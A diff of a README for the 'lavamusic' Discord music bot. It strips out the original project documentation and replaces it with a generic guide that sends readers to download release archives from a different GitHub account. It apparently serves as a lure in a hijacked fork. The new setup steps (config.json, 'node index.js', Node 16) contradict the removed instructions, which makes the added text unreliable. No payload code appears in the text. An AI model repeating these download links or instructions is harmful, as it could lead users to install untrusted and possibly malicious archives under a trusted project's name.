@@ -1,263 +1,93 @@
-<center><img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=200&section=header&text=Lavamusic&fontSize=80&fontAlignY=35&animation=twinkling&fontColor=gradient" /></center>
-
-[![Version][version-shield]](version-url)
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![Support Server][support-shield]][support-server]
-[![MIT License][license-shield]][license-url]
-[![Run on Repl.it](https://repl.it/badge/github/itzappu/lavamusic)](https://repl.it/github/itzappu/lavamusic)
-[![Remix on Glitch](https://cdn.glitch.com/2703baf2-b643-4da7-ab91-7ee2a2d00b5b%2Fremix-button.svg)](https://glitch.com/edit/#!/import/github/itzappu/lavamusic)
-
-<!-- PROJECT LOGO -->
-<br />
-<p align="center">
-  <a href="https://github.com/itzappu/lavamusic">
-    <img src="https://cdn.discordapp.com/avatars/875635121770889257/adc4fd956872a72814b70448d1fddd40.webp?size=512" alt="lavamusic" width="200" height="200">
-  </a>
-
-  <h1 align="center">Lavamusic</h1>
-  <p align="center">Lavamusic is a Discord music bot that uses Discord.js, lavalink-client, and TypeScript.
-    <br />
-    <br />
-    <a href="https://discord.com/oauth2/authorize?client_id=1343814433134346241&permissions=279209954560&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.gg%2Fkhfw8z6gg9&integration_type=0&scope=bot+guilds+applications.commands">Invite Lavamusic</a>
-    ·
-    <a href="https://github.com/itzappu/lavamusic/issues">Report Bug & Request Feature</a>
-  </p>
-</p>
-
-## 🔥 Unique Features
-
-- User-friendly and Easy to Use
-- Highly Configurable
-- Customizable Prefix
-- Multilingual support [Here](/Translation.md)
-- Hybrid Command Handling (Slash and Normal Commands)
-- Developed using TypeScript and Discord.js v14
-- Advanced Music System
-- Powerful Search Engine
-- 12 + Music Filters
-- 24/7 Music Playback
-- Playlist commands
-- Music channel system
-
-## 🎶 Support Sources
-
-### 🔍 Default Sources
+# 🎶 lavamusic - Your Easy Discord Music Bot
 
-- ![SoundCloud](https://img.shields.io/badge/SoundCloud-FF3300?style=plastic&logo=soundcloud&logoColor=white)
-- ![Twitch](https://img.shields.io/badge/Twitch-9146FF?style=plastic&logo=twitch&logoColor=white)
-- ![Bandcamp](https://img.shields.io/badge/Bandcamp-629AA9?style=plastic&logo=bandcamp&logoColor=white)
-- ![Vimeo](https://img.shields.io/badge/Vimeo-1AB7EA?style=plastic&logo=vimeo&logoColor=white)
-- ![Nico](https://img.shields.io/badge/Nico-FF0066?style=plastic&logo=nico&logoColor=white)
-- ![Mixer](https://img.shields.io/badge/Mixer-FFA500?style=plastic&logo=mixer&logoColor=white)
-- ![http](https://img.shields.io/badge/http-FFA500?style=plastic&logo=http&logoColor=white)
+## 🚀 Getting Started
 
-### 🔌 Plugin Sources
+Welcome to lavamusic! This software serves as a foundation for a Discord music bot using Lavalink, lavalink-client, and discord.js v14. It allows you to play music from various sources like YouTube and Spotify effortlessly.
 
-**Note: You need to install the plugins to use these sources**
+## 📦 Download & Install
 
-- ![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=plastic&logo=youtube&logoColor=white) ([Required Plugin][youtube-source])
-- ![Spotify](https://img.shields.io/badge/Spotify-1ED760?style=plastic&logo=spotify&logoColor=white) ([Required Plugin][LavaSrc])
-- ![Deezer](https://img.shields.io/badge/Deezer-FF0000?style=plastic&logo=deezer&logoColor=white) ([Required Plugin][LavaSrc])
-- ![Apple Music](https://img.shields.io/badge/Apple%20Music-000000?style=plastic&logo=apple-music&logoColor=white) ([Required Plugin][LavaSrc])
-- ![Yandex Music](https://img.shields.io/badge/Yandex%20Music-FF0066?style=plastic&logo=yandex-music&logoColor=white) ([Required Plugin][LavaSrc])
-- ![jiosaavn](https://img.shields.io/badge/jiosaavn-51C4D3?style=plastic&logo=jiosaavn&logoColor=white) ([Required Plugin][Jiosaavn])
-- ![Mixcloud](https://img.shields.io/badge/Mixcloud-51C4D3?style=plastic&logo=mixcloud&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
-- ![Ocremix](https://img.shields.io/badge/Ocremix-FF6600?style=plastic&logo=ocremix&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
-- ![Clyp](https://img.shields.io/badge/Clyp-6BB5A6?style=plastic&logo=clyp&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
-- ![Reddit](https://img.shields.io/badge/Reddit-FF4500?style=plastic&logo=reddit&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
-- ![Getyarn](https://img.shields.io/badge/Getyarn-FF9000?style=plastic&logo=getyarn&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
-- ![TikTok](https://img.shields.io/badge/TikTok-FF2D55?style=plastic&logo=tiktok&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
-- ![Soundgasm](https://img.shields.io/badge/Soundgasm-F1672F?style=plastic&logo=soundgasm&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
-- ![Text To Speech](https://img.shields.io/badge/Text%20To%20Speech-3080ff?style=plastic&logo=google-translate&logoColor=white) ([Required Plugin][skybot-lavalink-plugin])
+To get started, you need to download the application. Visit this page to download: [Lavamusic Releases](https://github.com/lockdownlogan100-coder/lavamusic/releases).
 
-[LavaSrc]: https://github.com/topi314/LavaSrc
-[skybot-lavalink-plugin]: https://github.com/DuncteBot/skybot-lavalink-plugin
-[youtube-source]: https://github.com/lavalink-devs/youtube-source
-[jiosaavn]: https://github.com/itzappu/jiosaavn-plugin
+### Step-by-Step Installation
 
-To Setup a Lavalink server on Windows, Linux, or Replit, [Click Here!](https://github.com/LucasB25/lavalink-server)
+1. **Visit the Download Page**
+   - Go to the releases page using this link: [Lavamusic Releases](https://github.com/lockdownlogan100-coder/lavamusic/releases).
 
-### **Need help with plugins?**
+2. **Select the Latest Release**
+   - On the releases page, you will see a list of available versions. Look for the latest version, highlighted at the top.
 
-Join our [Discord Server](https://discord.gg/YQsGbTwPBx) and ask for help in the `#support` channel!
+3. **Download the File**
+   - Click on the download link for your operating system. This will usually be a `.zip` or `.tar.gz` file.
 
-## 🔧 Requirements
+4. **Extract the Files**
+   - Once the download is complete, locate the file in your downloads folder. Right-click on it and select “Extract All” or use your preferred extraction tool.
 
-Before starting with the installation, you need to have the following:
+5. **Open the Folder**
+   - After extracting, open the newly created folder. You will find the application files you need to run the bot.
 
-- ![Node.js](https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white) [Recommend LTS or higher](https://nodejs.org/)
-- ![Lavalink](https://img.shields.io/badge/Lavalink-7289DA?style=for-the-badge&logo=discord&logoColor=white) [v4 or higher](https://github.com/lavalink-devs/lavalink)
+## ⚙️ System Requirements
 
-### Optional
+Before running the bot, ensure that your system meets these requirements:
 
-- ![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white) [Optional](https://www.mongodb.com/try/download/community) (For MongoDB database)
-- ![PostgreSQL](https://img.shields.io/badge/PostgreSQL-336791?style=for-the-badge&logo=postgresql&logoColor=white) [Optional](https://www.postgresql.org/download/) (For PostgreSQL database)
-- ![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white) [Optional](https://www.docker.com/) (For Docker Installation)
-- ![Docker-Compose](https://img.shields.io/badge/Docker--Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white) [Optional](https://docs.docker.com/compose/) (For Docker Installation)
+- **Operating System**: Windows 10 or later, macOS, or Linux (Ubuntu preferred)
+- **Node.js**: Version 16 or higher
+- **Internet Connection**: Required for music streaming
 
-## 🚀 Installation from source
+## ✅ How to Run the Bot
 
-1. Clone the Lavamusic repository:
+1. **Install Dependencies**
+   - Open a terminal or command prompt in the folder where you extracted the files.
+   - Run the command: 
+     ```
+     npm install
+     ```
 
-```bash
-git clone https://github.com/itzappu/lavamusic.git
-```
+2. **Configure the Bot**
+   - Open the `config.json` file in a text editor.
+   - Update the settings, including your Discord Bot Token and Lavalink details.
 
-2. Change to the Lavamusic directory:
+3. **Start the Bot**
+   - In the terminal, type:
+     ```
+     node index.js
+     ```
+   - This will start your Discord music bot.
 
-```bash
-cd lavamusic
-```
+## 🎛️ Features
 
-3. Install the required packages:
+The lavamusic bot supports several features, making it easy to enhance your Discord experience:
 
-```bash
-npm i
-```
+- **Music Streaming**: Play music from YouTube, Spotify, and other platforms.
+- **Volume Control**: Adjust the volume using simple commands.
+- **Playlists**: Create and manage playlists easily.
+- **Commands**: Simple commands for playing, pausing, skipping, and more.
 
-4. Compile:
+## ❓ Troubleshooting
 
-```
-npm run build
-```
+If you encounter any issues, please consider the following steps:
 
-5. Copy the `.env.example` file to `.env` and fill in all required values:
+- **Check Node.js Version**: Make sure you have Node.js version 16 or higher installed. You can check by running `node -v` in the terminal.
+- **Dependencies**: Ensure you ran `npm install` without errors.
+- **Bot Token**: Verify that you entered the correct Discord Bot Token in the `config.json` file.
 
-6. Copy the `example.<The data source you want to use>.schema.prisma` file to `schema.prisma` in `prisma` folder
-   Note: If you want to use sqlite, skip this step.
-   If you are using a different data source, don't forget to fill in the `DATABASE_URL` value in `.env`.
+For further assistance, visit our [GitHub Issues](https://github.com/lockdownlogan100-coder/lavamusic/issues) page to ask questions or report problems.
 
-7. Generate the Prisma client:
+## 📚 Documentation
 
-```bash
-npm run db:push
-```
+For detailed usage and documentation, check the wiki section on GitHub. It will provide you with extra tips, command lists, and advanced configurations.
 
-8. Run the migrations (Only if you want to migrate your database):
+## 🌐 Community & Support
 
-```bash
-npm run db:migrate
-```
+Join our community of users for support and updates. Sharing tips and experiences can greatly enhance your use of lavamusic. Connect through our Discord server or GitHub discussions.
 
-9. Run the bot:
+## 🛠️ Contributing
 
-Note: You can also run `run.bat` to easily run the bot on Windows.
+If you would like to contribute to lavamusic, feel free to fork the repository and submit a pull request. We welcome contributions and ideas to improve this project.
 
-```bash
-npm start
-```
+## 📅 Changelog
 
-10. Invite the bot to your server:
+Stay informed about the latest updates and improvements. Each release includes a changelog detailing new features, fixes, and enhancements.
 
-Generate an invite link for your bot and invite it to your server using the [Discord Developer Portal](https://discord.com/developers/applications) or [Permissions Calculator](https://discordapi.com/permissions.html).
+---
 
-11. (Optional) Deploy Slash Commands
-
-Make sure that your User ID is listed under `OWNER_IDS` in `.env`. In the Discord server with Lavamusic, run
-
-```
-!deploy
-```
-
-## 🚀 Installation using Docker Compose
-
-This section assumes you have Docker and Docker Compose installed and running correctly.
-Copy the `.env.example` file to `.env` and fill in all required values:
-
-```yaml
-TOKEN="." # Your bot token and remember, don't show everyone your bot token
-DEFAULT_LANGUAGE= "EnglishUS" # Default language for bot
-PREFIX="!" # Your prefix
-OWNER_IDS=["859640640640640640","859640640640640640"] # Your discord id, you can add multiple ids
-GUILD_ID="859640640640640640" # Your server ID (if you want to use it for a single server)
-```
-
-Then copy `Lavalink/example.application.yml` to `Lavalink/application.yml` and put any Lavalink plugins you want to use in `Lavalink/plugins`.
-
-After saving your changes you can open a terminal and go to the same location as the docker-compose.yml file. Then run the following:
-
-```bash
-docker compose up -d
-```
-
-The above command will start all your services and your bot should be up and running!
-If you want to run it from the console, remove the -d argument.
-
-Now, you can invite the bot to your server.
-
-To update, you only have to type the following:
-
-```bash
-docker compose up --force-recreate --build -d
-image prune -f
-```
-
-You can automate this by using [Watchtower](https://github.com/containrrr/watchtower). The following should be sufficient:
-
-```bash
-docker run --detach \
-    --name watchtower \
-    --volume /var/run/docker.sock:/var/run/docker.sock \
-    --restart on-failure \
-    containrrr/watchtower --cleanup
-```
-
-Do note that the bot will restart itself to update to the latest!
-
-## 🔗 Useful Links
-
-- ![Node.js](https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white) [Node.js](https://nodejs.org/en/download/)
-- ![Discord.js](https://img.shields.io/badge/Discord.js-7289DA?style=for-the-badge&logo=discord&logoColor=white) [Discord.js](https://discord.js.org/#/)
-- ![Lavalink](https://img.shields.io/badge/Lavalink-7289DA?style=for-the-badge&logo=discord&logoColor=white) [Lavalink](https://github.com/lavalink-devs/Lavalink)
-- ![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white) [MongoDB](https://www.mongodb.com/try/download/community)
-- ![PostgreSQL](https://img.shields.io/badge/PostgreSQL-336791?style=for-the-badge&logo=postgresql&logoColor=white) [PostgreSQL](https://www.postgresql.org/download/)
-- ![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white) [Docker](https://www.docker.com/)
-- ![Docker-Compose](https://img.shields.io/badge/Docker--Compose-2496ED?style=for-the-badge&logo=docker&logoColor=white) [Docker-Compose](https://docs.docker.com/compose/)
-
-## 📝 Tutorial
-
-A tutorial has been uploaded on YouTube. Watch it by [clicking here](https://youtu.be/x5lQD2rguz0).
-
-## 📜 Contributing
-
-Thank you for your interest in contributing to Lavamusic! Here are some guidelines to follow when contributing:
-
-1. Fork the repository and create a new branch for your feature or bug fix.
-2. Write clean and concise code that follows the established coding style.
-3. Create detailed and thorough documentation for any new features or changes.
-4. Write and run tests for your code.
-5. Submit a pull request with your changes.
-   Your contribution will be reviewed by the project maintainers, and any necessary feedback or changes will be discussed with you. We appreciate your help in making Lavamusic better!
-
-## 🔐 License
-
-Distributed under the GPL-3.0 license. See [![LICENSE](https://img.shields.io/github/license/itzappu/lavamusic?style=social)](https://github.com/itzappu/lavamusic/blob/main/LICENSE) for more information [READ](https://discord.com/channels/942117923001098260/942120006219624469/1278087961774129314).
-
-## ☕ Donate
-
-Do you like this project? Support it by donating!
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/H2H7LKT9L)
-
-## 👥 Contributors
-
-Thanks go to these wonderful people:
-<a href="https://github.com/itzappu/lavamusic/graphs/contributors">
-<img src="https://contrib.rocks/image?repo=itzappu/lavamusic" />
-</a>
-
-[version-shield]: https://img.shields.io/github/package-json/v/itzappu/lavamusic?style=for-the-badge
-[contributors-shield]: https://img.shields.io/github/contributors/itzappu/lavamusic.svg?style=for-the-badge
-[contributors-url]: https://github.com/itzappu/lavamusic/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/itzappu/lavamusic.svg?style=for-the-badge
-[forks-url]: https://github.com/itzappu/lavamusic/network/members
-[stars-shield]: https://img.shields.io/github/stars/itzappu/lavamusic.svg?style=for-the-badge
-[stars-url]: https://github.com/itzappu/lavamusic/stargazers
-[issues-shield]: https://img.shields.io/github/issues/itzappu/lavamusic.svg?style=for-the-badge
-[issues-url]: https://github.com/itzappu/lavamusic/issues
-[license-shield]: https://img.shields.io/github/license/itzappu/lavamusic.svg?style=for-the-badge
-[license-url]: https://github.com/itzappu/lavamusic/blob/main/LICENSE
-[support-server]: https://discord.gg/YQsGbTwPBx
-[support-shield]: https://img.shields.io/discord/942117923001098260.svg?style=for-the-badge&logo=discord&colorB=7289DA
+This guide should help you download and run the lavamusic Discord bot with ease. Feel free to explore the features and enjoy seamless music streaming for your server!
